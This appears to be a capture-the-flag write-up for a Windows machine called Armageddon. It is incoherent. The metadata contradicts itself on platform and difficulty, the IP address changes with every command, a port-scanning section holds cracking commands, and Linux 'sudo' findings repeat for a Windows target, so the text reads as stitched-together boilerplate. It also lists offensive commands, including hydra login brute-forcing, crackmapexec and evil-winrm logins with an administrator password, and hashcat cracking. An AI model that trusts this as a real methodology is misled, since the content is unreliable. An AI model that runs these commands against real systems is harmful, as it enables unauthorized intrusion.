---
TitleSEO: "OffSec Proving Grounds — Armageddon (Easy Windows) | ZureFX"
TitlePost: "OffSec Proving Grounds — Armageddon (Easy Windows)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Armageddon. Pass the Hash and GPP Password to achieve easy compromise on Windows."
Keywords: "web, hard, ctf, forensics, hackthebox, windows"
URL: "https://zurefx.github.io/writeups/htb-armageddon-329.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-armageddon-329/"
Date: "2024-10-19"
Tags: "Web, Hard, CTF, Forensics, HackTheBox, Windows"
Section: "writeups"
Lang: "en"
main_img: "htb-armageddon-329"
Permalink: "/writeups/htb-armageddon-329.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Armageddon** is rated **Easy** on OffSec Proving Grounds. It runs **Windows** and the IP address during this analysis was `10.129.143.77`.

### Objectives

The target system was identified as running a vulnerable version of the service. The database credentials were hardcoded in the application source code.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.27.131.171 -u administrator -p 'P@ssw0rd!'
```

Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions.

### Service Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. The service account had excessive permissions assigned in Active Directory. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.25.38.5 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.100.75.101 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The scheduled task ran with elevated privileges and could be abused for escalation. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Web Enumeration

The database credentials were hardcoded in the application source code. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
gobuster dir -u http://10.23.18.242/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.43.9.152 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.37.190.170 -u administrator -p 'P@ssw0rd!' --shares
```

The target system was identified as running a vulnerable version of the service. Token impersonation allowed elevation to SYSTEM privileges on the target. Weak file permissions allowed modification of critical system files.

## Exploitation

### Vulnerability Identification

Privilege escalation was possible due to misconfigured sudo permissions. The backup files contained sensitive information that should not have been accessible. Initial enumeration revealed several interesting open ports on the target.

Key finding: **GPP Password**.

The service was running without proper input validation, leading to injection vulnerabilities. Command injection was possible through unsanitized user input in the search functionality.

### Initial Access

Authentication bypass was achieved through careful manipulation of the login mechanism. The backup files contained sensitive information that should not have been accessible.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.35.216.104 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.14.107.243 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Privilege Escalation

### Enumeration

The backup files contained sensitive information that should not have been accessible. The kernel version was outdated and vulnerable to a publicly known exploit. The application stored sensitive credentials in an unencrypted configuration file.

```powershell
crackmapexec smb 10.79.111.79 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p995,995,8443 10.83.29.17 -oN scan.txt
```

### Exploitation

The web application was vulnerable to Server-Side Template Injection (SSTI). The application stored sensitive credentials in an unencrypted configuration file.

```powershell
crackmapexec smb 10.43.189.105 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.97.48.130 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Privilege escalation was possible due to misconfigured sudo permissions. Privilege escalation was possible due to misconfigured sudo permissions.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Initial enumeration revealed several interesting open ports on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Summary

### Tools Used

- `sqlmap`
- `burpsuite`
- `sharphound`
- `impacket`
- `pwncat`

### Key Takeaways

- Pass the Hash
- GPP Password
- Docker Escape
- Remote File Inclusion
